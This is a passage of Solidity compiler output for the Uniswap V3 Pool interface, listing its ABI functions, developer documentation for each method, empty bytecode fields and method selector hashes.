							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "The pool interface is broken up into many smaller pieces",
						"kind": "dev",
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"factory()": {
								"returns": {
									"_0": "The contract address"
								}
							},
							"fee()": {
								"returns": {
									"_0": "The fee"
								}
							},
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							},
							"slot0()": {
								"returns": {
									"sqrtPriceX96": "The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							},
							"token0()": {
								"returns": {
									"_0": "The token contract address"
								}
							},
							"token1()": {
								"returns": {
									"_0": "The token contract address"
								}
							}
						},
						"title": "The interface for a Uniswap V3 Pool",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"liquidity()": "1a686502",
							"maxLiquidityPerTick()": "70cf754a",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"observations(uint256)": "252c09d7",
							"observe(uint32[])": "883bdbfd",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"setFeeProtocol(uint8,uint8)": "8206a4d1",
							"slot0()": "3850c7bd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2",
							"swap(address,bool,int256,uint160,bytes)": "128acb08",
							"tickBitmap(int16)": "5339c296",
							"tickSpacing()": "d0c93a7c",
							"ticks(int24)": "f30dba93",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\